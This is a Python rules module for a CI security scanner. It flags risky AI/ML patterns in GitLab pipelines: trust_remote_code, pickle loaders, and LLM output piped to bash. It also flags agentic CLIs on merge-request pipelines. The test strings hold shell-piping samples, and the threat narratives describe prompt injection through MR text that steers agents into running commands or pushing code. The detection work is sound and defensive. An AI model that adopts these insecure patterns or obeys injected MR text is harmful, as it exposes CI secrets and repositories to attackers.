"""GitLab CI AI / ML security rules.

Shape and coverage intent mirror the GitHub AI rule module
(``taintly/rules/github/ai.py``). The AI-<PLAT>-NN id scheme keeps
equivalents from the two platforms grouped in the catalog.
"""

from taintly.models import (
    ContextPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)

RULES: list[Rule] = [
    # =========================================================================
    # AI-GL-001: trust_remote_code=True — HuggingFace arbitrary code execution
    # inside a GitLab CI script block.
    # =========================================================================
    Rule(
        id="AI-GL-001",
        title="HuggingFace trust_remote_code=True executes code from the model repo (GitLab)",
        severity=Severity.CRITICAL,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A transformers / diffusers / datasets call in a GitLab CI "
            "``script:`` sets ``trust_remote_code=True``. The "
            "HuggingFace library then imports and executes Python "
            "shipped inside the referenced model repository — the "
            "downloaded ``.py`` files run inside the CI container "
            "with full access to CI/CD variables, protected "
            "masked secrets, artefacts, and the ``CI_JOB_TOKEN``. "
            "A compromised or typo-squatted model repo behaves "
            "exactly like a malicious dependency install. The flag "
            "has no safe default: use an explicit model class that "
            "does not require remote code, or pin to a specific "
            "revision SHA whose code you have audited."
        ),
        pattern=RegexPattern(
            match=r"\btrust_remote_code\s*=\s*True\b",
            exclude=[
                r"^\s*#",
                r"--help",
            ],
        ),
        remediation=(
            "Do not opt into remote-code execution by default:\n"
            "\n"
            "1. Drop the flag and use a built-in architecture; "
            "   ``AutoModel.from_pretrained(name)`` works without "
            "   ``trust_remote_code`` for every officially supported "
            "   architecture.\n"
            "\n"
            "2. If the model genuinely requires remote code, pin to "
            "   a full 40-char ``revision=`` SHA that you have "
            "   reviewed.\n"
            "\n"
            "3. Run untrusted-model inference in a dedicated GitLab "
            "   runner / job image with no protected variables and "
            "   no write-scoped token."
        ),
        reference="https://huggingface.co/docs/transformers/en/main_classes/model#transformers.PreTrainedModel.from_pretrained.trust_remote_code",
        test_positive=[
            "  script:\n    - python -c \"AutoModel.from_pretrained('x', trust_remote_code=True)\"",
            "  script:\n    - python infer.py --trust_remote_code=True",
        ],
        test_negative=[
            "  script:\n    - python -c \"AutoModel.from_pretrained('x')\"",
            "  script:\n    - python -c \"AutoModel.from_pretrained('x', trust_remote_code=False)\"",
            '  # script:\n    # - python -c "... trust_remote_code=True"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker publishes (or compromises) a HuggingFace "
            "model repository referenced by the pipeline. As soon as "
            "the job instantiates the model with "
            "``trust_remote_code=True``, the ``.py`` files shipped "
            "inside the model repo are imported and executed with "
            "the job's full CI/CD variables, masked secrets, and "
            "``CI_JOB_TOKEN`` — no model inference ever has to run "
            "for the compromise to succeed."
        ),
    ),
    # =========================================================================
    # AI-GL-002: LLM output piped into a shell interpreter in a GitLab script.
    # GitLab mirror of AI-GH-007 — model output is a control channel.
    # =========================================================================
    Rule(
        id="AI-GL-002",
        title="LLM output reaches a shell interpreter in a GitLab script",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab CI ``script:`` captures the output of an "
            "LLM call and feeds it into a shell interpreter, "
            "``eval``, or ``python -c``. Patterns caught: "
            "``... | bash`` / ``... | sh`` / ``... | eval`` "
            "after an ``openai`` / ``anthropic`` / ``llm`` / "
            "``aider`` / ``claude -p`` / ``curl api.openai.com "
            '...`` call; ``eval "$(openai ...)"``. '
            "Same shape as AI-GH-007 for GitHub — the model's "
            "output becomes the next command the runner executes. "
            "If the prompt includes any attacker-controllable "
            "variable (``$CI_COMMIT_MESSAGE``, "
            "``$CI_MERGE_REQUEST_TITLE``, ``$CI_MERGE_REQUEST_"
            "DESCRIPTION``), the attacker's 'suggestion' becomes "
            "shell."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                r"(?:"
                r"\b(?:openai|anthropic)\s*[.(]"
                r"|\bopenai\s+api\b"
                r"|\b(?:llm|aider|claude)\s+-[mp]\b"
                r"|\bcurl\s+[^\n#]*api\."
                r"(?:openai|anthropic|cohere|mistral|groq|perplexity)\.[a-z]+"
                r")"
                r"[^\n#]*\|\s*(?:bash|sh|eval\b|python\s*-c)\b"
                r"|eval\s+[\"']?\$\([^)]*"
                r"(?:openai|anthropic|\bllm\s+|\baider|\bclaude\s+-p"
                r"|api\.(?:openai|anthropic))"
                r"[^)]*\)"
                r")"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Same as AI-GH-007: treat LLM output as attacker-"
            "shaped data. Never pipe it into a shell or "
            "``eval``. Parse structured JSON with ``jq`` into a "
            "strict allowlist of fields and fail closed on parse "
            "error."
        ),
        reference="https://simonwillison.net/2023/May/2/prompt-injection/",
        test_positive=[
            "  script:\n    - curl https://api.openai.com/v1/chat/completions -d @in.json | jq -r .content | bash",
            "  script:\n    - openai api chat.completions.create -m gpt-4 | bash",
            '  script:\n    - llm -m claude-sonnet-4 "label this" | sh',
            "  script:\n    - eval \"$(llm -m gpt-4 'generate config')\"",
        ],
        test_negative=[
            "  script:\n    - openai api chat.completions.create -m gpt-4 > out.json",
            "  script:\n    - jq -r '.label' response.json > label.txt",
            "  # script:\n  #   - curl api.openai.com | bash",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "The pipeline passes attacker-controllable text "
            "(``$CI_MERGE_REQUEST_TITLE`` / description / "
            "commit message) to an LLM; the LLM's reply flows "
            "into ``bash`` / ``eval``; the attacker's "
            "'suggestion' becomes shell with the job's full "
            "secrets and ``CI_JOB_TOKEN``."
        ),
    ),
    # =========================================================================
    # AI-GL-003: Non-torch pickle-backed loaders in a GitLab script.
    # GitLab mirror of AI-GH-010.
    # =========================================================================
    Rule(
        id="AI-GL-003",
        title="Non-torch pickle-backed loader without safety flag (GitLab)",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A GitLab CI script calls a pickle-backed loader "
            "from a framework other than PyTorch without the "
            "framework's documented safe flag. Covered: "
            "``tf.keras.models.load_model(...)`` missing "
            "``safe_mode=True``; ``joblib.load(...)``; "
            "``dill.load(...)`` / ``dill.loads(...)``; "
            "``cloudpickle.load(...)`` / ``cloudpickle.loads"
            "(...)``; ``numpy.load(..., allow_pickle=True)``. "
            "Every one of these invokes ``pickle`` and executes "
            "arbitrary Python via ``__reduce__`` the moment the "
            "file is parsed — same RCE class as AI-GL's torch "
            "sibling (not yet added), just in the rest of the "
            "ML stack."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                r"\b(?:tf\.)?keras\.models\.load_model\s*\("
                r"(?:(?!safe_mode\s*=\s*True).)*\)"
                r"|\bjoblib\.load\s*\("
                r"|\bdill\.loads?\s*\("
                r"|\bcloudpickle\.loads?\s*\("
                r"|\b(?:numpy|np)\.load\s*\((?:(?!allow_pickle\s*=\s*False).)*"
                r"allow_pickle\s*=\s*True"
                r")"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Same playbook as AI-GH-010:\n"
            "\n"
            "- Keras: pass ``safe_mode=True``.\n"
            "- ``joblib.load`` / ``dill`` / ``cloudpickle``: don't "
            "  load untrusted artefacts in CI; switch to "
            "  ``safetensors`` / ``.npz`` / ``.parquet``.\n"
            "- ``np.load``: drop ``allow_pickle=True``.\n"
            "\n"
            "Run a pickle scanner (``picklescan`` / ``modelscan`` "
            "/ ``fickling``) before any of these in a scanning "
            "stage that gates subsequent stages."
        ),
        reference="https://docs.python.org/3/library/pickle.html#restricting-globals",
        test_positive=[
            "  script:\n    - python -c \"import joblib; joblib.load('m.pkl')\"",
            "  script:\n    - python -c \"from tensorflow import keras; keras.models.load_model('m.keras')\"",
            "  script:\n    - python -c \"import dill; dill.load(open('x.pkl','rb'))\"",
            "  script:\n    - python -c \"import numpy as np; np.load('x.npy', allow_pickle=True)\"",
        ],
        test_negative=[
            "  script:\n    - python -c \"from tensorflow import keras; keras.models.load_model('m.keras', safe_mode=True)\"",
            "  script:\n    - python -c \"import numpy as np; np.load('x.npy', allow_pickle=False)\"",
            "  script:\n    - python -c \"import numpy as np; np.load('x.npy')\"",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Every pickle-backed loader in the ML stack treats "
            "the serialised file as Python bytecode the moment "
            "it's opened. A poisoned ``.pkl`` / ``.npy`` / "
            "``.keras`` downloaded from an attacker-controlled "
            "source gets arbitrary code execution in the GitLab "
            "runner with full CI/CD variable access."
        ),
    ),
    # =========================================================================
    # AI-GL-004: HuggingFace model / dataset fetch without a pinned revision.
    # GitLab mirror of AI-GH-002.
    # =========================================================================
    Rule(
        id="AI-GL-004",
        title="HuggingFace model / dataset downloaded without a pinned revision SHA (GitLab)",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A GitLab CI script invokes a HuggingFace download helper "
            "(``huggingface-cli download``, ``snapshot_download``, "
            "``hf_hub_download``, ``load_dataset``) without pinning the "
            "fetched artefact to a full 40-char commit SHA via "
            "``--revision`` or ``revision=``. Same shape as AI-GH-002: "
            "HuggingFace refs are mutable, so an unpinned fetch "
            "resolves to different bytes on different pipeline runs. "
            "Pin every fetch to a commit SHA — tag and branch pins "
            "still fire."
        ),
        pattern=SequencePattern(
            pattern_a=(
                r"(?:huggingface-cli\s+download"
                r"|\bsnapshot_download\s*\("
                r"|\bhf_hub_download\s*\("
                r"|\bload_dataset\s*\()"
            ),
            absent_within=(
                r"(?:--revision\s+['\"]?[a-f0-9]{40}['\"]?"
                r"|\brevision\s*=\s*['\"][a-f0-9]{40}['\"])"
            ),
            lookahead_lines=5,
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Same playbook as AI-GH-002: pin the ``revision=`` to a "
            "full 40-char commit SHA. Tags and branches are mutable."
        ),
        reference="https://huggingface.co/docs/huggingface_hub/en/guides/download#download-files-from-a-specific-revision",
        test_positive=[
            "  script:\n    - huggingface-cli download org/model",
            "  script:\n    - huggingface-cli download org/model --revision main",
            (
                "  script:\n"
                "    - |\n"
                "      python - <<'PY'\n"
                "      from huggingface_hub import snapshot_download\n"
                "      snapshot_download(repo_id='org/model')\n"
                "      PY"
            ),
        ],
        test_negative=[
            (
                "  script:\n    - huggingface-cli download org/model "
                "--revision abc123def456abc123def456abc123def456abc1"
            ),
            "  # script:\n  #   - huggingface-cli download org/model",
        ],
        stride=["T"],
        threat_narrative=(
            "A force-pushed HuggingFace tag / branch swaps the "
            "fetched bytes with every pipeline run. A compromised "
            "or typo-squatted repo ships new weights, new dataset "
            "rows, or new ``.py`` files into the next pipeline — "
            "directly on the runner, with whatever CI/CD "
            "variables the job has bound."
        ),
        confidence="medium",
    ),
    # =========================================================================
    # AI-GL-005: torch.load without weights_only=True.
    # GitLab mirror of AI-GH-003.
    # =========================================================================
    Rule(
        id="AI-GL-005",
        title="torch.load() without weights_only=True — pickle RCE on model load (GitLab)",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A GitLab CI script calls ``torch.load(...)`` without "
            "explicitly passing ``weights_only=True``. PyTorch's "
            "default unpickler runs ``pickle.load``, which executes "
            "arbitrary Python via ``__reduce__`` the moment the file "
            "is parsed. PyTorch 2.6 flipped the default, but every "
            "pipeline pinned to an older version (and every "
            "``.ckpt`` / ``.pt`` from an untrusted source on any "
            "version) remains exposed. Same RCE class as AI-GH-003."
        ),
        pattern=RegexPattern(
            match=r"\btorch\.load\s*\((?:(?!weights_only\s*=\s*True).)*\)",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Pass ``weights_only=True`` to every ``torch.load`` "
            "call. For weights that genuinely require pickled "
            "objects, load in a dedicated runner without masked "
            "secrets, or switch the artefact format to "
            "``.safetensors``."
        ),
        reference="https://pytorch.org/docs/stable/generated/torch.load.html",
        test_positive=[
            "  script:\n    - python -c \"import torch; torch.load('model.pt')\"",
            "  script:\n    - python -c \"torch.load(path, map_location='cpu')\"",
        ],
        test_negative=[
            "  script:\n    - python -c \"torch.load('model.pt', weights_only=True)\"",
            "  # script:\n  #   - python -c \"torch.load('model.pt')\"",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Any attacker who can influence the bytes of a "
            "``.pt`` / ``.ckpt`` / ``.bin`` file the pipeline "
            "loads — a compromised HuggingFace repo, a poisoned "
            "cache, a GitLab dependency artefact from an MR "
            "pipeline — gets arbitrary Python execution the "
            "instant ``torch.load`` parses the file."
        ),
        incidents=["CVE-2022-45907"],
    ),
    # =========================================================================
    # AI-GL-006: Model fetch without a scanner invocation in the same job.
    # GitLab mirror of AI-GH-004.
    # =========================================================================
    Rule(
        id="AI-GL-006",
        title="Model artefact fetched in a job that runs no pickle / model scanner (GitLab)",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A GitLab CI job fetches a model artefact (HuggingFace "
            "download helper, or ``wget`` / ``curl`` of a ``.pt`` / "
            "``.ckpt`` / ``.bin`` / ``.pkl`` file) but no pickle- or "
            "model-scanner (``picklescan``, ``modelscan``, "
            "``fickling``) runs in the same job. "
            "Same hygiene gap as AI-GH-004: the first thing to parse "
            "the bytes is the ML framework's own unpickler, so the "
            "scanner-absent path is the default code-execution "
            "primitive if the fetched model is poisoned. "
            "This rule can't verify the scanner ran on the file "
            "that was fetched; it reports only that no scanner was "
            "invoked in the same job at all."
        ),
        pattern=ContextPattern(
            anchor=(
                r"(?:huggingface-cli\s+download"
                r"|\bsnapshot_download\s*\("
                r"|\bhf_hub_download\s*\("
                r"|(?:wget|curl)\s+[^\n#]*\.(?:pt|ckpt|bin|pkl)\b)"
            ),
            requires=(
                r"(?:huggingface-cli\s+download"
                r"|\bsnapshot_download\s*\("
                r"|\bhf_hub_download\s*\("
                r"|(?:wget|curl)\s+[^\n#]*\.(?:pt|ckpt|bin|pkl)\b)"
            ),
            requires_absent=r"(?:\bpicklescan\b|\bmodelscan\b|\bfickling\b)",
            scope="job",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Run a model scanner on the fetched file before the "
            "ML framework parses it. For GitLab CI:\n"
            "\n"
            "  - pip install picklescan && picklescan --path models/\n"
            "\n"
            "Fail the job on non-zero exit so a flagged file "
            "can't reach ``torch.load`` / ``joblib.load``."
        ),
        reference="https://github.com/protectai/modelscan",
        test_positive=[
            (
                "infer:\n  stage: test\n  script:\n"
                "    - huggingface-cli download org/model\n"
                "    - python run_eval.py"
            ),
            (
                "fetch:\n  stage: build\n  script:\n"
                "    - wget https://example.com/weights.pt\n"
                "    - python eval.py"
            ),
        ],
        test_negative=[
            (
                "infer:\n  stage: test\n  script:\n"
                "    - huggingface-cli download org/model\n"
                "    - pip install picklescan && picklescan --path models/\n"
                "    - python run_eval.py"
            ),
            ("build:\n  stage: build\n  script:\n    - echo hi"),
        ],
        stride=["T"],
        threat_narrative=(
            "The attacker need not ``torch.load`` explicitly — "
            "any ML framework that parses the fetched file will "
            "hit the same unpickler. Without a scanner gate, a "
            "poisoned ``.pt`` / ``.pkl`` becomes code-execution "
            "with the job's full CI/CD variables and "
            "``CI_JOB_TOKEN``."
        ),
        confidence="medium",
    ),
    # =========================================================================
    # AI-GL-007: LLM call + attacker-controlled MR / commit context.
    # GitLab mirror of AI-GH-005.
    # =========================================================================
    Rule(
        id="AI-GL-007",
        title="LLM call in a pipeline that also reads attacker-controlled MR / commit content (GitLab)",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab pipeline invokes an LLM SDK / HTTP endpoint "
            "(``openai.*`` / ``anthropic.*`` / ``api.openai.com`` / "
            "``api.anthropic.com`` / ``generativelanguage.googleapis."
            "com`` / CLI tools like ``llm -m`` / ``claude -p``) and "
            "the same file references attacker-controllable variables: "
            "``$CI_MERGE_REQUEST_TITLE``, "
            "``$CI_MERGE_REQUEST_DESCRIPTION``, ``$CI_COMMIT_MESSAGE``, "
            "``$CI_COMMIT_TITLE``, or the source-branch name. "
            "Same attack shape as AI-GH-005 for GitHub. If that text "
            "ever reaches the model prompt, indirect prompt injection "
            "lets the attacker steer model output; if that output is "
            "later executed, it becomes a weird-shaped RCE path. "
            "The rule can't prove the attacker-controlled text "
            "actually reaches the prompt — surfaced at medium "
            "confidence."
        ),
        pattern=ContextPattern(
            anchor=(
                r"(?i:\b(?:open_?ai|anthropic)\s*[.(]"
                r"|\bChatOpenAI\b"
                r"|\bChatAnthropic\b"
                r"|\bChatCompletionsClient\b"
                r"|api\.(?:openai|anthropic|cohere|mistral|groq|perplexity)\.(?:com|ai)"
                r"|generativelanguage\.googleapis\.com"
                r"|\bopenai\s+api\s+(?:chat|complet|image)"
                r"|\bllm\s+(?:chat|prompt|-m)\b"
                r"|\b(?:claude|aider|openhands|swe-agent)\s+-[pm]\b)"
            ),
            requires=(
                r"\$\{?CI_MERGE_REQUEST_(?:TITLE|DESCRIPTION|SOURCE_BRANCH_NAME)"
                r"|\$\{?CI_COMMIT_(?:MESSAGE|TITLE|DESCRIPTION)"
                r"|\$\{?CI_EXTERNAL_PULL_REQUEST_(?:TITLE|SOURCE_BRANCH_NAME)"
            ),
            scope="file",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Treat LLM output on attacker-shaped input as untrusted "
            "data. Same playbook as AI-GH-005:\n"
            "\n"
            "- Never pipe the model's reply into ``bash`` / "
            "  ``eval`` / ``$GITHUB_ENV``-equivalents like "
            "  ``$CI_JOB_TOKEN`` writes / ``report.json`` that a "
            "  later step parses without validation.\n"
            "- Run the LLM step in a dedicated pipeline triggered "
            "  from a protected branch push after review, not on "
            "  every MR.\n"
            "- Strip or sandbox the attacker-shaped fields before "
            "  they reach the prompt."
        ),
        reference="https://simonwillison.net/2023/May/2/prompt-injection/",
        test_positive=[
            (
                "summarise:\n  stage: test\n  variables:\n"
                "    MR_BODY: $CI_MERGE_REQUEST_DESCRIPTION\n"
                "  script:\n"
                "    - curl https://api.anthropic.com/v1/messages -d @prompt.json"
            ),
            (
                "triage:\n  stage: test\n  variables:\n"
                "    TITLE: $CI_MERGE_REQUEST_TITLE\n"
                "  script:\n"
                '    - python -c "from openai import OpenAI; '
                'OpenAI().chat.completions.create(...)"'
            ),
            (
                "label:\n  stage: test\n  variables:\n"
                "    MSG: $CI_COMMIT_MESSAGE\n"
                "  script:\n"
                '    - llm -m claude-sonnet-4 "Review: $MSG"'
            ),
        ],
        test_negative=[
            # LLM call but no attacker-controlled context anywhere in file.
            (
                "changelog:\n  stage: release\n  script:\n"
                '    - python -c "import openai; openai.chat.completions.create(...)"'
            ),
            # MR context but no LLM call.
            ('label:\n  stage: test\n  script:\n    - echo "$CI_MERGE_REQUEST_TITLE"'),
            # Commented out.
            (
                "triage:\n  stage: test\n  script:\n"
                "    - echo hi\n"
                "    # - openai api chat.completions.create\n"
                "    #   MR: $CI_MERGE_REQUEST_TITLE"
            ),
        ],
        stride=["T", "E", "I"],
        threat_narrative=(
            "An attacker opens an MR whose title / description / "
            "commit message contains a prompt-injection payload. "
            "The pipeline passes that text to the model. If the "
            "model is equipped with tools or its output feeds a "
            "later step that parses it as instructions, the "
            "attacker has achieved code execution in the GitLab "
            "runner with whatever CI/CD variables and job token "
            "the job holds — without needing a single line of "
            "their code to run directly."
        ),
        confidence="medium",
    ),
    # =========================================================================
    # AI-GL-008: Agentic CLI on an MR-triggered pipeline.
    # GitLab mirror of AI-GH-013.
    # =========================================================================
    Rule(
        id="AI-GL-008",
        title="Agentic CLI invoked in a merge-request pipeline (GitLab)",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab CI ``script:`` invokes an agentic CLI — "
            "``claude -p`` (Claude Code), ``aider``, ``openhands``, "
            "``swe-agent``, ``cursor-agent`` — AND the same file "
            "enables the job on merge-request pipelines (via "
            "``only: merge_requests`` / ``rules: if: "
            "$CI_PIPELINE_SOURCE == 'merge_request_event'`` or "
            "similar). "
            "Same threat shape as AI-GH-013 for GitHub: the agent "
            "carries the job's full CI/CD variables and "
            "``CI_JOB_TOKEN`` into whatever tools it decides to "
            "call, and attacker-controlled MR / commit content "
            "steers those tool calls through the agent's own "
            "read tools (``glab`` / ``gh api`` / file readers) — "
            "without the YAML having to interpolate any of that "
            "text explicitly."
        ),
        pattern=ContextPattern(
            anchor=(r"\b(?:claude\s+-p|aider\s|openhands\s|swe-agent\s|cursor-agent\s)"),
            # GitLab MR-pipeline enablement — any of:
            #   only: / only: [..., merge_requests, ...]
            #   rules: if: $CI_PIPELINE_SOURCE == 'merge_request_event'
            #   rules with $CI_MERGE_REQUEST_ID
            requires=(
                r"(?:\bmerge_requests?\b"
                r"|\$CI_PIPELINE_SOURCE\s*==\s*['\"]?merge_request_event"
                r"|\$CI_MERGE_REQUEST_(?:ID|IID|TITLE|DESCRIPTION)"
                r"|\$CI_EXTERNAL_PULL_REQUEST_)"
            ),
            scope="file",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Restrict agent runs to protected branches / "
            "maintainer triggers:\n"
            "\n"
            "1. Move the agent job out of MR pipelines entirely. "
            "   Run it on ``rules: - if: $CI_COMMIT_BRANCH == "
            "   $CI_DEFAULT_BRANCH`` or on a scheduled pipeline.\n"
            "\n"
            "2. Scope the agent's tool surface with its "
            "   ``--allowed-tools`` / ``--disallowed-tools`` flag "
            "   so prompt-inject payloads can't reach "
            "   ``glab`` / filesystem / bash.\n"
            "\n"
            "3. Bind the agent job to a dedicated runner with no "
            "   masked credentials and no write-scoped "
            "   ``CI_JOB_TOKEN``."
        ),
        reference="https://docs.anthropic.com/claude-code",
        test_positive=[
            (
                "review:\n  stage: test\n"
                "  only:\n    - merge_requests\n"
                "  script:\n    - claude -p 'review the MR'"
            ),
            (
                "triage:\n  stage: test\n"
                "  rules:\n"
                "    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n"
                "  script:\n    - aider --yes-always --message 'fix issues'"
            ),
        ],
        test_negative=[
            # Agent CLI but only on protected-branch pushes / schedules.
            (
                "chore:\n  stage: release\n"
                "  rules:\n"
                "    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n"
                "  script:\n    - claude -p 'refresh docs'"
            ),
            # MR pipeline but no agentic CLI.
            ("test:\n  stage: test\n  only:\n    - merge_requests\n  script:\n    - pytest"),
            # Commented out.
            (
                "triage:\n  stage: test\n"
                "  only:\n    - merge_requests\n"
                "  script:\n"
                "    # - aider --yes-always\n"
                "    - echo hi"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "The agent treats its tool outputs as next-action "
            "fodder. A prompt injection in an MR description or "
            "commit message — reached via the agent's own "
            "``glab mr view`` / ``glab issue view`` tools, not "
            "via the pipeline YAML — steers the CLI into calling "
            "bash, writing files, or pushing commits back to the "
            "repo with the runner's ``CI_JOB_TOKEN``."
        ),
        confidence="medium",
    ),
    # =========================================================================
    # AI-GL-009: GitLab port of AI-GH-015 — agent + MR trigger + push-capable
    # primitive in the same file.  GitLab's pipeline model has no
    # ``permissions:`` block to gate on, so the third leg of the triangle is
    # not a permission grant but an explicit push/write primitive somewhere
    # in the job's shell: ``git push``, ``glab mr create/update``,
    # ``glab issue create/update``, registry push via ``CI_REGISTRY_*``
    # credentials, or API writes via ``glab api -X (POST|PUT|PATCH)``.
    # Without one of those primitives the agent's exploitation path is
    # constrained even on an MR pipeline.
    #
    # Severity matches AI-GH-015 (CRITICAL) — the triangle is the same shape.
    # =========================================================================
    Rule(
        id="AI-GL-009",
        title=(
            "AI agent in MR pipeline combined with an explicit "
            "push-capable primitive (agent + fork + write)"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab CI configuration invokes an AI coding agent "
            "(``claude -p``, ``aider``, ``openhands``, ``swe-agent``, "
            "``cursor-agent``, or an SDK call / agent-package install) "
            "AND the job is reachable via merge-request pipelines "
            "(``only: merge_requests`` / ``rules: if: "
            "$CI_PIPELINE_SOURCE == 'merge_request_event'``) AND the "
            "same file contains an explicit push-capable primitive: "
            "``git push``, ``glab mr (create|update)``, "
            "``glab issue (create|update)``, ``glab api -X (POST|"
            "PUT|PATCH)``, or a ``docker push`` / ``podman push`` "
            "to a registry credential the pipeline binds.  This is "
            "the GitLab analog of AI-GH-015's agent + fork-trigger + "
            "repo-write-permission triangle.  With all three legs "
            "present, attacker-controlled MR / commit content steers "
            "the agent through its own ``glab mr view`` / "
            "``glab issue view`` tools, and the write primitive "
            "gives the steered agent a direct push channel using "
            "``CI_JOB_TOKEN`` or a bound ``GITLAB_TOKEN`` / "
            "``CI_PUSH_OPTIONS``."
        ),
        pattern=ContextPattern(
            # Broad agent anchor: CLI invocation, `include:` of a known
            # agent template, `image:` pulling an agent container, or a
            # package install.  Kept in sync with AI-GL-008's CLI list
            # plus the GH shared anchor's install + SDK arms.
            anchor=(
                r"(?i:"
                # CLI invocations — unique flag / subcommand forms
                r"\bclaude\s+-p\b"
                r"|\baider\s"
                r"|\bopenhands\s"
                r"|\bswe-agent\s"
                r"|\bcursor-(?:agent|cli)\s"
                r"|\bcodex\s+(?:exec|chat|complete)\b"
                # Package / container installs
                r"|\bnpm\s+(?:install|i)\s+(?:-g\s+)?"
                r"(?:@anthropic-ai/claude-code|@anthropic-ai/sandbox-runtime"
                r"|aider-chat|@openai/codex-cli|@cursor/cli|claude-code)\b"
                r"|\bpip\s+install\s+(?:aider-chat|claude-code-sdk|anthropic|"
                r"openai|langchain|litellm)\b"
                r"|\bpipx\s+install\s+(?:aider-chat|claude-code-sdk)\b"
                # SDK shapes — identical to GH (same Python/JS SDK names)
                r"|\b(?:open_?ai|anthropic)\s*(?:\.(?!com\b|ai\b)|\()"
                r"|\bChatOpenAI\b"
                r"|\bChatAnthropic\b"
                # Provider API hostnames
                r"|api\.anthropic\.com(?!/api/(?:github|claude-app)/)"
                r"|api\.(?:openai|cohere|mistral|groq|perplexity)\.(?:com|ai)"
                r"|generativelanguage\.googleapis\.com"
                r")"
            ),
            # Two file-level preconditions: MR-pipeline enablement AND a
            # push-capable primitive.  Same lookahead-at-\A shape as
            # AI-GH-015 — O(N) on the file, ReDoS-safe.
            requires=(
                r"\A"
                # MR trigger
                r"(?=[\s\S]*?"
                r"(?:\bmerge_requests?\b"
                r"|\$CI_PIPELINE_SOURCE\s*==\s*['\"]?merge_request_event"
                r"|\$CI_MERGE_REQUEST_(?:ID|IID|TITLE|DESCRIPTION)"
                r"|\$CI_EXTERNAL_PULL_REQUEST_)"
                r")"
                # Push-capable primitive
                r"(?=[\s\S]*?"
                r"(?:"
                # Explicit git push (not `git push origin --dry-run` which
                # is a read — handled by the anchor_job_exclude-style
                # exclude below at line level)
                r"\bgit\s+push\b"
                # glab MR/issue write subcommands
                r"|\bglab\s+(?:mr|issue)\s+(?:create|update|close|reopen)\b"
                # glab API write methods
                r"|\bglab\s+api\s+-X\s+(?:POST|PUT|PATCH|DELETE)\b"
                # Container-image push (docker/podman) — implies registry
                # credentials are bound in the job
                r"|\b(?:docker|podman)\s+push\b"
                r")"
                r")"
            ),
            scope="file",
            exclude=[
                r"^\s*#",
            ],
        ),
        remediation=(
            "An AI agent reachable via an MR pipeline that ALSO has an\n"
            "explicit push/write primitive is a direct code-pushing\n"
            "primitive for anyone who can open an MR.  Three layered\n"
            "mitigations (pick what fits):\n"
            "  1. Remove the push leg from the MR-triggered path.  Move\n"
            "     `git push` / `glab mr create` / registry push into a\n"
            "     separate job gated on `if: $CI_COMMIT_BRANCH ==\n"
            "     $CI_DEFAULT_BRANCH` or `if: $CI_COMMIT_TAG`.\n"
            "  2. Gate the agent job by MR source.  GitLab exposes\n"
            "     `$CI_MERGE_REQUEST_SOURCE_PROJECT_ID` — when it is\n"
            "     equal to `$CI_PROJECT_ID` the MR is same-project\n"
            "     (not a fork).  Fork MRs carry the higher risk.\n"
            "  3. Drop the agent's blanket-confirmation flags and\n"
            "     enumerate its tool surface with `--allowed-tools` so\n"
            "     prompt-inject payloads can't reach shell / `glab` /\n"
            "     filesystem / docker tools at all.\n"
            "Run `taintly --guide AI-GH-015` for the full checklist\n"
            "(the GitHub guide applies directly with glab/git-push\n"
            "substitutions)."
        ),
        reference=(
            "https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/; "
            "https://docs.gitlab.com/user/project/merge_requests/merge_request_dependencies/; "
            "https://docs.anthropic.com/claude-code"
        ),
        test_positive=[
            # Agent CLI + MR trigger + git push
            (
                "autofix:\n  stage: review\n"
                "  rules:\n    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n"
                "  script:\n"
                "    - claude -p 'fix the lint issues'\n"
                "    - git push origin HEAD:${CI_COMMIT_REF_NAME}"
            ),
            # Agent install + MR trigger + glab mr create
            (
                "triage:\n  stage: review\n"
                "  only:\n    - merge_requests\n"
                "  script:\n"
                "    - npm install -g @anthropic-ai/claude-code\n"
                "    - claude -p 'triage this'\n"
                "    - glab mr update $CI_MERGE_REQUEST_IID --label triaged"
            ),
            # SDK call + MR trigger + docker push
            (
                "review-image:\n  stage: review\n"
                "  rules:\n    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n"
                "  script:\n"
                '    - python -c "import anthropic; anthropic.Anthropic().messages.create(...)"\n'
                "    - docker push $CI_REGISTRY_IMAGE:review-$CI_MERGE_REQUEST_IID"
            ),
        ],
        test_negative=[
            # Agent + MR but no push primitive (AI-GL-008 territory, not 009)
            ("review:\n  only:\n    - merge_requests\n  script:\n    - claude -p 'review'"),
            # Agent + push but NOT on MR trigger (release workflow)
            (
                "release:\n  rules:\n    - if: $CI_COMMIT_TAG\n"
